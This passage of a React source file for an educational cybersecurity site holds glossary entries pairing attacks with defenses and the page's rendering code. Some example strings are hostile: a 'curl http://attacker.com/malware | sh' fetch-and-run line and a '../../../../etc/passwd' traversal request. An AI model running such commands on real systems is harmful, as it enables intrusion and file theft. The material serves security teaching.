    definition: "Brute forcing systematically guesses passwords for a single account. Password spraying flips this by trying one common password (e.g. 'Summer2026!') across thousands of different user accounts to evade per-account lockout policies.",
    example: "An attacker queries an Active Directory login portal with 1,000 employee usernames using the single password `Company@2026!`, bypassing account lockouts that trigger at 5 attempts.",
    mitigation: "Implement progressive delay throttles, cross-account IP rate limiting, anomaly detection, and enforce hardware security keys (FIDO2).",
  },
  {
    term: "Clickjacking (UI Redressing)",
    category: "Attacks",
    definition: "A malicious technique where an attacker embeds a legitimate, trusted website inside an invisible transparent `<iframe>` layer overlaid precisely on top of a decoy button (e.g., 'Click here to win a prize'), tricking the user into clicking banking or admin controls.",
    example: "A game website has a button 'Play Game'. Positioned invisibly directly over it is an iframe with the victim's social media 'Delete Account' button.",
    mitigation: "Send HTTP header `X-Frame-Options: DENY` or Content Security Policy `frame-ancestors 'none'` to instruct browsers to forbid framing.",
  },
  {
    term: "Man-in-the-Middle (MitM) & SSL Stripping",
    category: "Attacks",
    definition: "An interception attack where an adversary secretly relays and potentially alters communications between two parties. SSL Stripping actively intercepts initial plaintext HTTP requests and prevents the browser from upgrading to secure HTTPS.",
    example: "An attacker running a rogue Wi-Fi hotspot in a coffee shop intercepts an unencrypted HTTP navigation to a portal, stripping TLS and sniffing passwords in cleartext.",
    mitigation: "Enforce HTTPS everywhere with HTTP Strict Transport Security (`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`).",
  },
  {
    term: "Session Fixation & Hijacking",
    category: "Attacks",
    definition: "Session hijacking involves stealing an active session token (via XSS or network sniffing). Session fixation involves an attacker pre-setting a known session ID in the victim's browser and waiting for the victim to authenticate, after which the attacker uses the fixed ID.",
    example: "An attacker sends a link `https://bank.com/?session_id=attacker_token`. The victim clicks and signs in; the backend fails to regenerate the session ID, allowing the attacker to access the account.",
    mitigation: "Always regenerate session tokens immediately upon successful authentication, and bind sessions to secure, HttpOnly, SameSite cookies.",
  },
  {
    term: "Content Security Policy (CSP)",
    category: "Defense",
    definition: "A powerful HTTP response header allowing site administrators to declare an allow-list of approved sources from which the browser is allowed to load and execute resources (scripts, styles, images, fonts, iframes, AJAX requests).",
    example: "A response sends `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'`. Any inline `<script>` injected via XSS is blocked by the browser.",
    mitigation: "Implement a strict nonce-based or hash-based CSP, ban `unsafe-inline` and `eval()`, and monitor violations using `report-uri` / `report-to`.",
  },
  {
    term: "HSTS (HTTP Strict Transport Security)",
    category: "Protocols",
    definition: "A security header informing web browsers that the domain must only ever be accessed using secure HTTPS connections, automatically converting all insecure `http://` links to `https://` before sending any packets.",
    example: "`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` tells the browser to remember for 1 year that plain HTTP is strictly prohibited.",
    mitigation: "Deploy HSTS with at least 1 year duration, include subdomains, and submit your domain to the official Chromium HSTS preload list.",
  },
  {
    term: "SameSite Cookie Attribute",
    category: "Protocols",
    definition: "A cookie security flag controlling whether cookies are attached to cross-origin requests. `Strict` blocks cookies on all cross-site requests. `Lax` allows cookies only on top-level incoming GET navigations. `None` requires the `Secure` flag.",
    example: "`Set-Cookie: session=xyz; SameSite=Lax; Secure; HttpOnly`. When a malicious site triggers a background POST request to your bank, the browser strips the session cookie.",
    mitigation: "Default all session cookies to `SameSite=Lax` or `SameSite=Strict` for sensitive banking and state-changing application cookies.",
  },
  {
    term: "HttpOnly & Secure Cookie Flags",
    category: "Defense",
    definition: "`HttpOnly` blocks client-side JavaScript (`document.cookie`) from accessing the cookie, preventing credential theft via XSS. `Secure` ensures the cookie is only transmitted across encrypted TLS/HTTPS channels, blocking plaintext network sniffing.",
    example: "`Set-Cookie: auth_token=9a8b7c; Secure; HttpOnly; SameSite=Strict; Path=/` provides complete defense against transport sniffing and DOM-based extraction.",
    mitigation: "Make `Secure` and `HttpOnly` mandatory standard flags across all authentication and session identifiers.",
  },
  {
    term: "CORS (Cross-Origin Resource Sharing)",
    category: "Protocols",
    definition: "An HTTP-header based security mechanism allowing a server to specify which external origins (domains) are permitted to read its API responses, overcoming the browser's default Same-Origin Policy (SOP).",
    example: "An API server sends `Access-Control-Allow-Origin: https://app.example.com` allowing only that trusted domain to read private JSON data in JavaScript.",
    mitigation: "Never return `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Explicitly validate the incoming `Origin` header against an allow-list.",
  },
  {
    term: "Argon2id Key Derivation",
    category: "Crypto",
    definition: "The state-of-the-art password hashing algorithm that won the Password Hashing Competition (PHC). It is memory-hard and compute-hard, providing maximum mathematical resistance against dedicated GPU, FPGA, and ASIC cracking rigs.",
    example: "Hashing a password using Argon2id with 64MB memory cost, 3 iterations, and 4 parallel threads ensures brute-forcing takes decades per hash.",
    mitigation: "Use Argon2id or bcrypt (cost factor >= 12) for all new application password storage systems.",
  },
  {
    term: "bcrypt Algorithm",
    category: "Crypto",
    definition: "A battle-tested adaptive key derivation function based on the Blowfish cipher. It incorporates a salt to protect against rainbow table attacks and features a configurable 'work factor' (cost) that can be increased as hardware speeds up.",
    example: "A bcrypt hash `$2b$12$e8n...` uses cost 12 ($2^{12} = 4,096$ iterations), requiring ~250ms of CPU time per password verification.",
    mitigation: "Configure bcrypt cost to balance server response time with security (typically cost 12 to 14 in modern production backends).",
  },
  {
    term: "Cryptographic Salt & Pepper",
    category: "Crypto",
    definition: "A salt is a unique, cryptographically random string generated per user and appended to passwords before hashing, defeating precomputed Rainbow Tables. A pepper is a secret application-wide key stored separately from the database.",
    example: "Two users choose the password `Password123!`. With unique salts, their resulting database hashes are completely different, preventing simultaneous dictionary cracking.",
    mitigation: "Always generate unique salts using a CSPRNG (at least 16 bytes). Modern algorithms (Argon2, bcrypt) handle salts automatically.",
  },
  {
    term: "JWT (JSON Web Token) Security",
    category: "Protocols",
    definition: "An open standard (RFC 7519) defining a compact, URL-safe container format for transmitting cryptographically signed claims. Common vulnerabilities include accepting the `none` algorithm, weak HMAC secrets, or storing sensitive tokens in `localStorage`.",
    example: "A token `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` signed with an asymmetric RSA private key and verified by microservices using the public key.",
    mitigation: "Enforce strict algorithm verification (`alg: RS256` or `ES256`), keep token lifespans short (e.g. 15 minutes), and store refresh tokens in secure HttpOnly cookies.",
  },
  {
    term: "Web Application Firewall (WAF)",
    category: "Defense",
    definition: "An application-layer (Layer 7) security filter that inspects incoming HTTP/HTTPS traffic to identify and block malicious payloads, including SQLi, XSS, automated scrapers, and zero-day exploit attempts before they reach the web server.",
    example: "A Cloudflare or AWS WAF rule detects a SQL injection payload `UNION SELECT 1,2,3` in an HTTP query parameter and drops the connection with an immediate 403 Forbidden.",
    mitigation: "Deploy a managed WAF in front of web applications as a defense-in-depth shield, but never treat a WAF as a replacement for secure coding practices.",
  },
  {
    term: "Rate Limiting & Throttling",
    category: "Defense",
    definition: "The enforcement of operational limits on how many requests a specific IP address, user account, or API key is allowed to make within a defined time window (e.g. using the Token Bucket or Sliding Window algorithm).",
    example: "An API gateway restricts clients to 100 requests/minute. Exceeding this returns HTTP `429 Too Many Requests` with a `Retry-After: 60` header.",
    mitigation: "Implement tiered rate limiting: strict limits on authentication/reset endpoints (5/min) and broader limits on general data APIs (1000/hour).",
  },
  {
    term: "CVE & CVSS Scoring",
    category: "Fundamentals",
    definition: "CVE (Common Vulnerabilities and Exposures) is a standardized dictionary of public security flaws (e.g. CVE-2021-44228 Log4j). CVSS (Common Vulnerability Scoring System) assigns a severity score from 0.0 (None) to 10.0 (Critical) based on attack vector, complexity, and impact.",
    example: "A vulnerability scored CVSS 9.8 Critical requires no authentication, is remotely exploitable over the network, and results in complete data and system loss.",
    mitigation: "Monitor project dependencies in CI/CD with automated scanners (`npm audit`, Snyk, Dependabot) and patch High/Critical CVEs within 24-48 hours.",
  },
  {
    term: "Remote Code Execution (RCE)",
    category: "Attacks",
    definition: "One of the most dangerous vulnerabilities in cybersecurity, where an attacker exploits a flaw to execute arbitrary system commands or malware directly on the target host server or container.",
    example: "An unpatched image processing library executes embedded shell commands inside a malicious uploaded JPEG: `image.jpg; curl http://attacker.com/malware | sh`.",
    mitigation: "Never pass user input to shell execution functions (`exec()`, `system()`, `eval()`), run application containers in read-only filesystems, and apply least privilege.",
  },
  {
    term: "Subresource Integrity (SRI)",
    category: "Defense",
    definition: "A browser security feature enabling web applications to ensure that files fetched from third-party CDNs (e.g., jQuery, Bootstrap) have not been modified or infected with malicious scripts.",
    example: "`<script src='https://cdn.example.com/lib.js' integrity='sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC' crossorigin='anonymous'></script>`.",
    mitigation: "Always generate and include base64 cryptographic integrity hashes on all third-party hosted scripts and stylesheets.",
  },
  {
    term: "Path Traversal & Local File Inclusion (LFI)",
    category: "Attacks",
    definition: "A vulnerability allowing an attacker to read arbitrary files from the server's filesystem by manipulating file path parameters using directory traversal sequences (`../` or `%2e%2e%2f`).",
    example: "An endpoint `GET /view?file=report.pdf` is manipulated to `GET /view?file=../../../../etc/passwd`, allowing the attacker to download the server's user list.",
    mitigation: "Avoid passing user input directly to filesystem APIs. Use fixed filename maps, strip directory traversal characters, and verify canonical paths stay within safe root directories.",
  },
];

/* ------------------------------------------------------------------ */
/* Interactive Module Card Component                                  */
/* ------------------------------------------------------------------ */

function ModuleCard({
  module,
  isOpen,
  onToggle,
}: {
  module: Module;
  isOpen: boolean;
  onToggle: () => void;
}) {
  const { navigate } = useApp();
  const panelId = `module-panel-${module.labId}`;

  return (
    <GlowCard accent={module.accent} className="overflow-hidden">
      <button
        onClick={onToggle}
        aria-expanded={isOpen}
        aria-controls={panelId}
        className="flex w-full items-center gap-4 p-6 text-left"
      >
        <span
          className={cx("grid h-12 w-12 shrink-0 place-items-center rounded-xl", accentText(module.accent))}
          style={{ background: `color-mix(in srgb, ${accentHex(module.accent)} 12%, transparent)` }}
        >
          <Icon name={module.icon} size={24} />
        </span>
        <span className="min-w-0 flex-1">
          <span className="flex flex-wrap items-center gap-2 font-mono text-[11px] uppercase tracking-widest text-subtle">
            <span className={accentText(module.accent)}>Module {module.number}</span>
            <span aria-hidden>·</span>
            <span>{module.domain}</span>
            <span aria-hidden>·</span>
            <span className="text-cyan">{module.owaspRef.split(" - ")[0]}</span>
          </span>
          <span className="mt-0.5 block text-lg font-semibold text-foreground">{module.title}</span>
        </span>
        <span className="hidden items-center gap-1.5 font-mono text-[11px] text-subtle sm:flex">
          <Icon name="clock" size={13} /> {module.readMinutes} min read
        </span>
        <Icon
          name="chevron-down"
          size={20}
          className={cx("shrink-0 text-subtle transition-transform duration-300", isOpen && "rotate-180")}
        />
      </button>

      {isOpen && (
        <div id={panelId} className="animate-fade-slide border-t border-border/70 p-6">
          <p className="text-[15px] leading-relaxed text-muted-foreground">{module.intro}</p>

          {/* Real-World Case Study */}
          <div className="mt-6 rounded-xl border border-warning/30 bg-warning/5 p-4 sm:p-5">
            <div className="flex items-center gap-2 font-mono text-xs font-semibold uppercase tracking-widest text-warning">
              <Icon name="alert-triangle" size={15} /> Real-World Case Study: {module.realWorldBreach.target} ({module.realWorldBreach.year})
            </div>
            <p className="mt-2 text-sm text-foreground/90"><strong>Impact:</strong> {module.realWorldBreach.impact}</p>
            <p className="mt-1 text-sm text-muted-foreground"><strong>Defender Lesson:</strong> {module.realWorldBreach.lesson}</p>
          </div>

          {/* Detailed Sections with Code Snippets */}
          <div className="mt-6 space-y-6">
            {module.sections.map((s) => (
              <div key={s.heading}>
                <h4 className={cx("font-mono text-xs font-semibold uppercase tracking-widest", accentText(module.accent))}>
                  {s.heading}
                </h4>
                <p className="mt-2 text-sm leading-relaxed text-muted-foreground">{s.body}</p>
                {s.codeSnippet && (
                  <pre className="mt-3 overflow-x-auto rounded-xl border border-border bg-[#080d1a] p-4 font-mono text-xs text-foreground/90 leading-relaxed">
                    <code>{s.codeSnippet}</code>
                  </pre>
                )}
              </div>
            ))}
          </div>

          {/* Defender Implementation Checklist */}
          <div className="mt-8 rounded-xl border border-success/30 bg-success/5 p-5">
            <div className="flex items-center gap-2 font-mono text-xs font-semibold uppercase tracking-widest text-success">
              <Icon name="check-circle" size={15} /> Defender Implementation Checklist
            </div>
            <ul className="mt-3 space-y-2">
              {module.defenseChecklist.map((item, idx) => (
                <li key={idx} className="flex items-start gap-2.5 text-sm text-foreground/85">
                  <Icon name="check" size={15} className="mt-0.5 shrink-0 text-success" />
                  <span>{item}</span>
                </li>
              ))}
            </ul>
          </div>

          {/* Key Terms */}
          <div className="mt-6">
            <div className="font-mono text-[10px] uppercase tracking-widest text-subtle">Key Technical Concepts</div>
            <div className="mt-2 flex flex-wrap gap-2">
              {module.keyTerms.map((t) => (
                <Chip key={t}>{t}</Chip>
              ))}
            </div>
          </div>

          {/* Lab Link Button */}
          <div className="mt-8 flex flex-wrap items-center justify-between gap-4 border-t border-border/50 pt-5">
            <span className="font-mono text-xs text-muted-foreground">
              Reference: <strong className="text-foreground">{module.owaspRef}</strong> ({module.cweRef})
            </span>
            <PremiumButton
              size="sm"
              variant="outline"
              iconRight="arrow-right"
              onClick={() => navigate({ name: "lab", labId: module.labId })}
            >
              Practise in Lab {module.number}
            </PremiumButton>
          </div>
        </div>
      )}
    </GlowCard>
  );
}

/* ------------------------------------------------------------------ */
/* Main Resources Page Component                                      */
/* ------------------------------------------------------------------ */

export function Resources() {
  const [openId, setOpenId] = useState<string | null>(MODULES[0]?.labId ?? null);
  const [selectedCheatSheet, setSelectedCheatSheet] = useState<string>("headers");
  const [glossaryFilter, setGlossaryFilter] = useState<string>("All");
  const [searchTerm, setSearchTerm] = useState<string>("");

  const filteredGlossary = useMemo(() => {
    return GLOSSARY.filter((item) => {
      const matchesCategory = glossaryFilter === "All" || item.category === glossaryFilter;
      const matchesSearch =
        searchTerm === "" ||
        item.term.toLowerCase().includes(searchTerm.toLowerCase()) ||
        item.definition.toLowerCase().includes(searchTerm.toLowerCase());
      return matchesCategory && matchesSearch;
    });
  }, [glossaryFilter, searchTerm]);

  const activeCheatSheet = useMemo(() => {
    return CHEAT_SHEETS.find((c) => c.id === selectedCheatSheet) || CHEAT_SHEETS[0];
  }, [selectedCheatSheet]);

  return (
    <div className="mx-auto max-w-5xl px-5 pb-24 pt-28 sm:px-8 sm:pt-32">
      <SectionHeader
        eyebrow="Resources & Study Library"
        title="Cybersecurity Knowledge Base"
        description="Comprehensive learning curriculum, attack breakdowns, code mitigation blueprints, and cheat sheets for student defenders."
      />

      {/* 1. Foundations Primer */}
      <Reveal className="mt-14">
        <div className="flex items-center gap-2 font-mono text-[11px] uppercase tracking-widest text-cyan">
          <Icon name="compass" size={14} /> Core Security Foundations
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          {FOUNDATIONS.map((f) => (
            <div key={f.title} className="flex flex-col justify-between rounded-2xl border border-border bg-card p-5 transition-all duration-300 hover:border-cyan/40">
              <div>
                <div className={cx("flex items-center gap-2", accentText(f.accent))}>
                  <Icon name={f.icon} size={18} />
                  <h3 className="text-base font-semibold text-foreground">{f.title}</h3>
                </div>
                <div className="mt-1 font-mono text-[11px] text-cyan/80">{f.subtitle}</div>
                <p className="mt-2.5 text-xs leading-relaxed text-muted-foreground">{f.body}</p>
              </div>
            </div>
          ))}
        </div>
      </Reveal>

      {/* 2. Deep-Dive Study Modules */}
      <Reveal className="mt-14">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 font-mono text-[11px] uppercase tracking-widest text-cyan">
            <Icon name="book" size={14} /> Interactive Study Modules & Labs
          </div>
          <span className="font-mono text-xs text-muted-foreground hidden sm:inline">5 In-Depth Domains</span>
        </div>
        <div className="mt-4 space-y-4">
          {MODULES.map((m) => (
            <ModuleCard
              key={m.labId}
              module={m}
              isOpen={openId === m.labId}
              onToggle={() => setOpenId((cur) => (cur === m.labId ? null : m.labId))}
            />
          ))}
        </div>
      </Reveal>

      {/* 3. Quick Reference Cheat Sheets */}
      <Reveal className="mt-16">
        <div className="flex items-center gap-2 font-mono text-[11px] uppercase tracking-widest text-cyan">
          <Icon name="terminal" size={14} /> Defender's Cheat Sheets & Standards
        </div>
        <div className="mt-4 rounded-2xl border border-border bg-card p-6">
          {/* Tab Selector */}
          <div className="flex flex-wrap gap-2 border-b border-border/70 pb-4">
            {CHEAT_SHEETS.map((c) => (
              <button
                key={c.id}
                onClick={() => setSelectedCheatSheet(c.id)}
                className={cx(
                  "flex items-center gap-2 rounded-xl px-4 py-2 font-mono text-xs transition-all",
                  selectedCheatSheet === c.id
                    ? "bg-cyan/15 text-cyan border border-cyan/40 font-semibold"
                    : "text-muted-foreground hover:bg-surface hover:text-foreground"
                )}
              >
                <Icon name={c.icon} size={14} />
                {c.title}
              </button>
            ))}
          </div>

          {/* Active Cheat Sheet Grid */}
          <div className="mt-6 grid gap-4 sm:grid-cols-2">
            {activeCheatSheet.items.map((item) => (
              <div key={item.key} className="rounded-xl border border-border/80 bg-surface/60 p-4">
                <div className="flex items-start justify-between gap-2">
                  <span className="font-mono text-xs font-semibold text-foreground">{item.key}</span>
                  {item.badge && (
                    <span
                      className={cx(
                        "rounded px-2 py-0.5 font-mono text-[10px] font-semibold uppercase",
                        item.badgeType === "good"
                          ? "bg-success/15 text-success"
                          : item.badgeType === "warn"
                          ? "bg-warning/15 text-warning"
                          : "bg-cyan/15 text-cyan"
                      )}
                    >
                      {item.badge}
                    </span>
                  )}
                </div>
                <p className="mt-2 text-xs leading-relaxed text-muted-foreground">{item.desc}</p>
                {item.recommendedValue && (
                  <div className="mt-3 overflow-x-auto rounded-lg bg-[#060a14] p-2.5 font-mono text-[11px] text-cyan border border-cyan/20">
                    <code>{item.recommendedValue}</code>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </Reveal>

      {/* 4. External Free Learning Platforms & Tools */}
      <Reveal className="mt-16">
        <div className="flex items-center gap-2 font-mono text-[11px] uppercase tracking-widest text-cyan">
          <Icon name="link" size={14} /> Industry Tools & Free Practice Portals
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          {EXTERNAL_RESOURCES.map((r) => (
            <a
              key={r.title}
              href={r.url}
              target="_blank"
              rel="noopener noreferrer"
              className="group flex flex-col justify-between rounded-2xl border border-border bg-card p-5 transition-all duration-300 hover:-translate-y-1 hover:border-cyan/50 hover:shadow-lg hover:shadow-cyan/5"
            >
              <div>
                <div className="flex items-center justify-between">
                  <span className="grid h-9 w-9 place-items-center rounded-lg bg-cyan/10 text-cyan">
                    <Icon name={r.icon} size={18} />
                  </span>
                  <Icon name="arrow-up-right" size={16} className="text-subtle transition-transform group-hover:translate-x-0.5 group-hover:-translate-y-0.5 group-hover:text-cyan" />
                </div>
                <span className="mt-3 block font-mono text-[10px] uppercase tracking-widest text-cyan">{r.category}</span>
                <h4 className="mt-1 text-sm font-semibold text-foreground group-hover:text-cyan transition-colors">{r.title}</h4>
                <p className="mt-2 text-xs leading-relaxed text-muted-foreground">{r.desc}</p>
              </div>
              <div className="mt-4 flex items-center gap-1 font-mono text-[11px] text-subtle group-hover:text-foreground">
                <span>Visit Resource</span>
                <Icon name="chevron-right" size={12} />
              </div>
            </a>
          ))}
        </div>
      </Reveal>

      {/* 5. Searchable Cyber Glossary (30+ Terms) */}
      <Reveal className="mt-16">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-2 font-mono text-[11px] uppercase tracking-widest text-cyan">
            <Icon name="search" size={14} /> Searchable Cybersecurity Glossary ({GLOSSARY.length} Terms)
          </div>

          {/* Category Filter Chips */}
          <div className="flex flex-wrap gap-1.5">
            {["All", "Fundamentals", "Attacks", "Defense", "Protocols", "Crypto"].map((cat) => (
              <button
                key={cat}
                onClick={() => setGlossaryFilter(cat)}
                className={cx(
                  "rounded-lg px-2.5 py-1 font-mono text-[11px] transition-all",
                  glossaryFilter === cat
                    ? "bg-cyan text-[#060a14] font-semibold"
                    : "bg-surface text-muted-foreground hover:text-foreground border border-border"
                )}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        {/* Search Input Bar */}
        <div className="mt-4 relative">
          <Icon name="search" size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-subtle" />
          <input
            type="text"
            placeholder="Search cybersecurity terminology (e.g. XSS, IDOR, CSP, HSTS, Salt, Salt, JWT)..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full rounded-xl border border-border bg-card py-2.5 pl-10 pr-4 font-mono text-xs text-foreground placeholder:text-subtle focus:border-cyan focus:outline-none focus:ring-1 focus:ring-cyan"
          />
        </div>

        {/* Glossary Grid */}
        <div className="mt-6 grid gap-5 sm:grid-cols-2">
          {filteredGlossary.map((g) => (
            <div
              key={g.term}
              className="flex flex-col justify-between rounded-2xl border border-border bg-card p-5 transition-all duration-300 hover:border-cyan/40 hover:shadow-lg hover:shadow-cyan/5"
            >
              <div>
                <div className="flex items-center justify-between gap-2 border-b border-border/60 pb-3">
                  <dt className="text-base font-semibold text-foreground">{g.term}</dt>
                  <span className="rounded-full bg-cyan/10 px-2.5 py-0.5 font-mono text-[10px] uppercase tracking-wider text-cyan border border-cyan/30">
                    {g.category}
                  </span>
                </div>

                {/* Core Concept Definition */}
                <dd className="mt-3 text-xs leading-relaxed text-muted-foreground">{g.definition}</dd>

                {/* Real-World Example Callout */}
                <div className="mt-4 rounded-xl border border-warning/20 bg-warning/[0.04] p-3.5">
                  <div className="flex items-center gap-1.5 font-mono text-[11px] font-semibold uppercase tracking-wider text-warning">
                    <Icon name="lightbulb" size={13} /> Practical Example / Scenario
                  </div>
                  <p className="mt-1.5 font-mono text-[11px] leading-relaxed text-foreground/90">{g.example}</p>
                </div>

                {/* Defender Mitigation Box */}
                <div className="mt-3 rounded-xl border border-success/25 bg-success/[0.04] p-3.5">
                  <div className="flex items-center gap-1.5 font-mono text-[11px] font-semibold uppercase tracking-wider text-success">
                    <Icon name="shield" size={13} /> Defender Fix & Mitigation
                  </div>
                  <p className="mt-1 text-xs leading-relaxed text-muted-foreground">{g.mitigation}</p>
                </div>
              </div>
            </div>
          ))}
          {filteredGlossary.length === 0 && (
            <div className="col-span-full rounded-2xl border border-dashed border-border p-12 text-center">
              <Icon name="search" size={24} className="mx-auto text-subtle" />
              <p className="mt-3 text-sm text-foreground">No matching cybersecurity terms found for "{searchTerm}".</p>
              <p className="mt-1 text-xs text-muted-foreground">Try searching for keywords like XSS, SQLi, IDOR, CSP, or Salt.</p>
            </div>
          )}
        </div>
      </Reveal>
    </div>
  );
}
